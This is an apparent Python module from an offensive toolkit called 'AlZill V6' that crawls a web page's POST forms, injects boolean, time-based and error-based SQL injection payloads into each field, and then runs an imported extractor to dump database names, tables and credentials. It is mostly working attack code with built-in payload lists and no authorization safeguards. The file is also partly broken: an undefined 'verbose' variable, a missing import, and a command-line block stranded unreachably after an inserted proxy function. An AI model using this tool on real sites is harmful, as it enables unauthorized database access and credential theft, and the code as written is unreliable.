#!/usr/bin/env python3
# modules/sqli_post_scanner.py
# AlZill Module: SQLi POST Scanner (V6 - Integrated with Advanced Extractor)
# No False Positives - Uses Delimiters and Column Guessing

import requests
import re
import os
from termcolor import cprint
from urllib.parse import urlparse, urljoin

# Import the advanced extractor
from modules.sqli_data_extractor import SQLiDataExtractor, save_leaked_data

# ============================================================
# Color Definitions
# ============================================================
INFO = "cyan"
SUCCESS = "green"
WARNING = "yellow"
ERROR = "red"
HIGHLIGHT = "magenta"

# ============================================================
# Configuration
# ============================================================
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
}

TIMEOUT = 15
DELAY = 1

# ============================================================
# LOAD DETECTION PAYLOADS FROM EXTERNAL FILE
# ============================================================

def load_detection_payloads(payloads_file="payloads.txt"):
    """Load detection payloads from external file"""
    detection_payloads = {
        'boolean_true': [],
        'boolean_false': [],
        'time_based': [],
        'error_based': []
    }
    
    # Default payloads (fallback)
    default_payloads = {
        'boolean_true': [
            "' AND '1'='1", "' OR '1'='1", "1' AND '1'='1",
            "1' OR '1'='1", "' AND 1=1-- -", "' OR 1=1-- -",
            "1' AND 1=1-- -", "1' OR 1=1-- -",
        ],
        'boolean_false': [
            "' AND '1'='2", "' OR '1'='2", "1' AND '1'='2",
            "1' OR '1'='2", "' AND 1=2-- -", "' OR 1=2-- -",
            "1' AND 1=2-- -", "1' OR 1=2-- -",
        ],
        'time_based': [
            ("' OR SLEEP(5)-- -", 5),
            ("'; WAITFOR DELAY '00:00:05'-- -", 5),
            ("' AND pg_sleep(5)-- -", 5),
            ("' OR BENCHMARK(5000000, MD5('test'))-- -", 3),
        ],
        'error_based': [
            "'", '"', "1'", "1\"",
            "' AND extractvalue(1,concat(0x7e,database()))-- -",
            "' AND updatexml(1,concat(0x7e,database()),1)-- -",
            "1' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        ]
    }
    
    if not os.path.exists(payloads_file):
        cprint(f"[!] Payloads file not found, using defaults", "yellow")
        return default_payloads
    
    try:
        with open(payloads_file, 'r', encoding='utf-8') as f:
            content = f.read()
        
        current_section = None
        
        for line in content.split('\n'):
            line = line.strip()
            
            if not line or line.startswith('#'):
                continue
            
            if line.startswith('[') and line.endswith(']'):
                current_section = line[1:-1].upper()
                continue
            
            # Load SQLI_TIME as time-based detection
            if current_section == 'SQLI_TIME':
                parts = line.split('|')
                if len(parts) >= 2:
                    payload = parts[0]
                    try:
                        delay = int(parts[1])
                        detection_payloads['time_based'].append((payload, delay))
                    except ValueError:
                        detection_payloads['time_based'].append((payload, 5))
                else:
                    detection_payloads['time_based'].append((line, 5))
            
            # Load SQLI_ERROR as error-based detection
            elif current_section == 'SQLI_ERROR':
                detection_payloads['error_based'].append(line)
            
            # Load SQLI_BOOLEAN for boolean detection
            elif current_section == 'SQLI_BOOLEAN':
                parts = line.split('|')
                if len(parts) >= 2:
                    detection_payloads['boolean_true'].append(parts[0])
                    detection_payloads['boolean_false'].append(parts[1])
        
        # If we loaded custom payloads, use them
        if detection_payloads['time_based'] or detection_payloads['error_based']:
            cprint(f"[+] Loaded detection payloads from {payloads_file}", "green")
            cprint(f"    Time-based: {len(detection_payloads['time_based'])} payloads", "cyan")
            cprint(f"    Error-based: {len(detection_payloads['error_based'])} payloads", "cyan")
            cprint(f"    Boolean-based: {len(detection_payloads['boolean_true'])} pairs", "cyan")
            return detection_payloads
        
    except Exception as e:
        cprint(f"[!] Error loading payloads: {e}", "red")
    
    return default_payloads


# Load detection payloads
DETECTION_PAYLOADS = load_detection_payloads()


def send_request(form, data):
    """
    Send POST request to the form action URL
    Returns response object
    """
    headers = HEADERS.copy()
    
    # Add CSRF token if present in form
    if 'csrf_token' in form:
        data['csrf_token'] = form['csrf_token']
    elif 'csrf' in form:
        data['csrf'] = form['csrf']
    
    try:
        response = requests.post(
            form['action'],
            data=data,
            headers=headers,
            timeout=TIMEOUT,
            allow_redirects=False,
            verify=False
        )
        return response
    except requests.exceptions.Timeout:
        cprint(f"[!] Timeout while sending request to {form['action']}", "yellow")
        dummy = requests.Response()
        dummy._content = b""
        dummy.status_code = 408
        return dummy
    except Exception as e:
        cprint(f"[!] Request error: {e}", "red")
        dummy = requests.Response()
        dummy._content = b""
        dummy.status_code = 500
        return dummy


def get_baseline_response(form, field_name, original_value=""):
    """
    Send baseline request to get normal response for comparison
    """
    test_data = {}
    for field in form['fields']:
        if field == field_name:
            test_data[field] = original_value if original_value else "test123"
        else:
            test_data[field] = "1" if field in ['id', 'user_id', 'product_id'] else "test"
    
    try:
        response = send_request(form, test_data)
        return {
            'text': response.text,
            'length': len(response.text),
            'status': response.status_code,
            'time': response.elapsed.total_seconds()
        }
    except:
        return None


def test_boolean_injection(form, field_name, baseline):
    """
    Test for boolean-based SQL injection
    Returns True if vulnerable
    """
    cprint(f"[*] Testing boolean-based injection on '{field_name}'...", "blue")
    
    true_payloads = DETECTION_PAYLOADS.get('boolean_true', [])
    false_payloads = DETECTION_PAYLOADS.get('boolean_false', [])
    
    for true_payload in true_payloads[:5]:
        for false_payload in false_payloads[:5]:
            try:
                # Test with true payload
                test_data = {}
                for field in form['fields']:
                    test_data[field] = true_payload if field == field_name else "1"
                
                resp_true = send_request(form, test_data)
                
                # Test with false payload
                test_data = {}
                for field in form['fields']:
                    test_data[field] = false_payload if field == field_name else "1"
                
                resp_false = send_request(form, test_data)
                
                # Compare responses
                if baseline:
                    len_true_diff = abs(len(resp_true.text) - baseline['length'])
                    len_false_diff = abs(len(resp_false.text) - baseline['length'])
                    
                    # If true response is similar to baseline and false is different
                    if len_true_diff < 100 and len_false_diff > 150:
                        cprint(f"[+] Boolean-based SQLi detected on '{field_name}'!", "green")
                        return True
                    
                    # If responses are significantly different from each other
                    if abs(len(resp_true.text) - len(resp_false.text)) > 200:
                        cprint(f"[+] Boolean-based SQLi detected on '{field_name}'!", "green")
                        return True
                        
            except Exception as e:
                if verbose:
                    cprint(f"[!] Boolean test error: {e}", "yellow")
                continue
    
    return False


def test_time_injection(form, field_name):
    """
    Test for time-based SQL injection
    Returns True if vulnerable
    """
    cprint(f"[*] Testing time-based injection on '{field_name}'...", "blue")
    
    time_payloads = DETECTION_PAYLOADS.get('time_based', [])
    
    for payload, expected_delay in time_payloads:
        try:
            test_data = {}
            for field in form['fields']:
                test_data[field] = payload if field == field_name else "1"
            
            import time
            start = time.time()
            response = send_request(form, test_data)
            elapsed = time.time() - start
            
            if elapsed >= expected_delay * 0.8:
                cprint(f"[+] Time-based SQLi detected on '{field_name}'! (Delay: {elapsed:.2f}s)", "green")
                return True
                
        except Exception as e:
            if verbose:
                cprint(f"[!] Time test error: {e}", "yellow")
            continue
    
    return False


def test_error_injection(form, field_name):
    """
    Test for error-based SQL injection
    Returns database name or True if vulnerable
    """
    cprint(f"[*] Testing error-based injection on '{field_name}'...", "blue")
    
    error_patterns = [
        r'SQL syntax.*MySQL',
        r'Warning.*mysql_.*',
        r'MySQLSyntaxErrorException',
        r'valid MySQL result',
        r'PostgreSQL.*ERROR',
        r'Warning.*\Wpg_.*',
        r'valid PostgreSQL result',
        r'ORA-[0-9]{5}',
        r'Oracle error',
        r'Oracle.*Driver',
        r'SQLite/JDBCDriver',
        r'SQLite.Exception',
        r'System.Data.SQLite.SQLiteException',
        r'Warning.*sqlite_.*',
        r'valid SQLite',
        r'SQL Server.*Driver',
        r'Driver.*SQL Server',
        r'SQLServer JDBC Driver',
        r'com.microsoft.sqlserver',
        r'Unclosed quotation mark',
    ]
    
    error_payloads = DETECTION_PAYLOADS.get('error_based', [])
    
    for payload in error_payloads:
        try:
            test_data = {}
            for field in form['fields']:
                test_data[field] = payload if field == field_name else "1"
            
            response = send_request(form, test_data)
            
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    cprint(f"[+] Error-based SQLi detected on '{field_name}'!", "green")
                    
                    # Try to extract database name from error
                    db_match = re.search(r"database:?\s*['\"]?([a-zA-Z_][a-zA-Z0-9_]*)['\"]?", response.text, re.IGNORECASE)
                    if db_match:
                        cprint(f"[+] Database name leaked: {db_match.group(1)}", "green")
                    
                    return True
                    
        except Exception as e:
            if verbose:
                cprint(f"[!] Error test error: {e}", "yellow")
            continue
    
    return False


def scan(url, verbose=False, payloads_file="payloads.txt", proxy_session=None):
    """
    Main scanning function - finds forms and tests for SQLi
    """
    global verbose_flag
    verbose_flag = verbose
    
    # Reload payloads with custom file if provided
    if payloads_file != "payloads.txt":
        global DETECTION_PAYLOADS
        DETECTION_PAYLOADS = load_detection_payloads(payloads_file)
    
    cprint("\n" + "="*60, "cyan")
    cprint("[SQLi POST SCANNER] AlZill V6 Pro", "magenta", attrs=['bold'])
    cprint("="*60, "cyan")
    cprint(f"[*] Target: {url}", INFO)
    cprint(f"[*] Payloads: External from {payloads_file}", "yellow")
    
    try:
        response = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        html = response.text
    except Exception as e:
        cprint(f"[!] Failed to fetch {url}: {e}", "red")
        return
    
    # Extract forms from HTML
    forms = extract_forms_from_html(html, url)
    
    if not forms:
        cprint("[!] No forms found on page", "yellow")
        return
    
    cprint(f"[+] Found {len(forms)} form(s) on page", "green")
    
    vulnerable_forms = []
    
    for i, form in enumerate(forms):
        cprint(f"\n[*] Testing Form #{i+1} (action: {form['action']})", "magenta")
        
        for field in form['fields']:
            cprint(f"    Testing field: {field}", "blue")
            
            # Step 1: Get baseline response
            baseline = get_baseline_response(form, field)
            
            # Step 2: Test for boolean injection
            if test_boolean_injection(form, field, baseline):
                vulnerable_forms.append((form, field))
                cprint(f"    [!] Form #{i+1}, field '{field}' is vulnerable to SQLi!", "red")
                continue
            
            # Step 3: Test for time injection
            if test_time_injection(form, field):
                vulnerable_forms.append((form, field))
                cprint(f"    [!] Form #{i+1}, field '{field}' is vulnerable to Time-based SQLi!", "red")
                continue
            
            # Step 4: Test for error injection
            if test_error_injection(form, field):
                vulnerable_forms.append((form, field))
                cprint(f"    [!] Form #{i+1}, field '{field}' is vulnerable to Error-based SQLi!", "red")
                continue
    
    # ============================================================
    # DATA EXTRACTION USING ADVANCED EXTRACTOR
    # ============================================================
    if vulnerable_forms:
        cprint(f"\n[!] Found {len(vulnerable_forms)} vulnerable parameter(s)!", "red", attrs=['bold'])
        
        for form, field_name in vulnerable_forms:
            cprint(f"\n{'='*60}", "cyan")
            cprint(f"[*] Launching AlZill V6 Data Extractor on: {field_name}", "yellow")
            cprint(f"{'='*60}", "cyan")
            
            try:
                extractor = SQLiDataExtractor(verbose=verbose_flag)
                results = extractor.extract(form, field_name, send_request, db_type="auto")
                
                if results and results.get('data'):
                    cprint(f"\n[+] EXTRACTION SUMMARY:", "green", attrs=['bold'])
                    cprint(f"    Database Type: {results.get('db_type', 'Unknown')}", "cyan")
                    cprint(f"    Database Name: {results.get('database', 'Unknown')}", "cyan")
                    cprint(f"    Database User: {results.get('user', 'Unknown')}", "cyan")
                    cprint(f"    Columns Count: {results.get('column_count', 'Unknown')}", "cyan")
                    cprint(f"    Tables Found: {len(results.get('tables', []))}", "cyan")
                    cprint(f"    Credentials Extracted: {len(results.get('data', []))}", "green")
                    
                    if results.get('data'):
                        cprint(f"\n    Sample extracted credentials:", "yellow")
                        for cred in results['data'][:5]:
                            cprint(f"      → {cred}", "white")
                else:
                    cprint(f"[!] No data extracted from {field_name}", "yellow")
                    cprint(f"[*] The field may be vulnerable but requires manual exploitation", "cyan")
                    
            except Exception as e:
                cprint(f"[!] Extractor error on {field_name}: {e}", "red")
                if verbose_flag:
                    import traceback
                    traceback.print_exc()
    else:
        cprint(f"\n[+] No SQLi vulnerabilities found in any form", "green")
    
    return vulnerable_forms


def extract_forms_from_html(html, base_url):
    """
    Extract all forms from HTML with their fields
    """
    forms = []
    
    form_pattern = r'<form[^>]*>(.*?)</form>'
    form_matches = re.findall(form_pattern, html, re.IGNORECASE | re.DOTALL)
    
    if not form_matches:
        form_pattern = r'<form[^>]*>(.*?)(?:</form>|$)'
        form_matches = re.findall(form_pattern, html, re.IGNORECASE | re.DOTALL)
    
    for form_html in form_matches:
        action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
        if action_match:
            action = urljoin(base_url, action_match.group(1))
        else:
            action = base_url
        
        method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
        method = method_match.group(1).upper() if method_match else "GET"
        
        if method != "POST":
            continue
        
        csrf_token = None
        csrf_patterns = [
            r'<input[^>]*name=["\'](csrf_token|csrf|csrfmiddlewaretoken|_token|authenticity_token)["\'][^>]*>',
            r'<input[^>]*value=["\']([^"\']+)["\'][^>]*name=["\'](csrf_token|csrf)["\']',
        ]
        
        for pattern in csrf_patterns:
            csrf_match = re.search(pattern, form_html, re.IGNORECASE)
            if csrf_match:
                if len(csrf_match.groups()) >= 2:
                    csrf_token = csrf_match.group(1)
                else:
                    csrf_token = csrf_match.group(1) if csrf_match.group(1) else csrf_match.group(0)
                break
        
        fields = []
        input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
        input_matches = re.findall(input_pattern, form_html, re.IGNORECASE)
        
        for field in input_matches:
            if field.lower() not in ['submit', 'button', 'reset', 'csrf_token']:
                fields.append(field)
        
        textarea_pattern = r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>'
        textarea_matches = re.findall(textarea_pattern, form_html, re.IGNORECASE)
        fields.extend(textarea_matches)
        
        select_pattern = r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>'
        select_matches = re.findall(select_pattern, form_html, re.IGNORECASE)
        fields.extend(select_matches)
        
        if fields:
            forms.append({
                'action': action,
                'method': method,
                'fields': list(set(fields)),
                'csrf_token': csrf_token,
                'raw_html': form_html
            })
    
    return forms


def try_exploit(form, field_name, target_url, payloads_file="payloads.txt"):
    """Direct exploit function - calls the advanced extractor"""
    cprint(f"[*] Launching AlZill V6 Data Extractor on: {field_name}", "yellow")
    cprint(f"[*] Using delimiter-based extraction (No false positives)", "cyan")
    
    try:
        extractor = SQLiDataExtractor(verbose=True)
        results = extractor.extract(form, field_name, send_request, db_type="auto")
        
        if results and results.get('data'):
            cprint(f"[+] Successfully extracted {len(results['data'])} credentials!", "green")
            return results['data']
        else:
            cprint(f"[!] No data extracted from {field_name}", "yellow")
            return []
            
    except Exception as e:
        cprint(f"[!] Extractor error: {e}", "red")
        return []


def scan_post_forms(url, verbose=False, payloads_file="payloads.txt"):
    """Legacy function for backward compatibility"""
    return scan(url, verbose, payloads_file)


if __name__ == "__main__":
    import sys

# ============================================================
# Proxy Support (Auto-injected)
# ============================================================
def get_session_with_proxy(proxy_session=None):
    """Get requests session with proxy support"""
    if proxy_session:
        return proxy_session
    return requests.Session()


def request_with_retry(url, method='GET', data=None, json=None, headers=None, 
                       proxy_session=None, max_retries=3, delay=2, **kwargs):
    """Send request with automatic retry and proxy support"""
    session = get_session_with_proxy(proxy_session)
    
    for attempt in range(max_retries):
        try:
            if method.upper() == 'GET':
                response = session.get(url, headers=headers, timeout=10, verify=False, **kwargs)
            elif method.upper() == 'POST':
                response = session.post(url, data=data, json=json, headers=headers, 
                                       timeout=10, verify=False, **kwargs)
            else:
                response = session.request(method, url, headers=headers, 
                                          timeout=10, verify=False, **kwargs)
            return response
        except (requests.exceptions.ConnectionError, ConnectionResetError) as e:
            if attempt < max_retries - 1:
                time.sleep(delay)
            else:
                raise e
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(delay)
            else:
                raise e
    return None

    if len(sys.argv) > 1:
        target = sys.argv[1]
        payloads_file = sys.argv[2] if len(sys.argv) > 2 else "payloads.txt"
        verbose = '--verbose' in sys.argv or '-v' in sys.argv
        scan(target, verbose=verbose, payloads_file=payloads_file)
    else:
        print("Usage: python sqli_post_scanner.py <url> [payloads_file] [--verbose]")
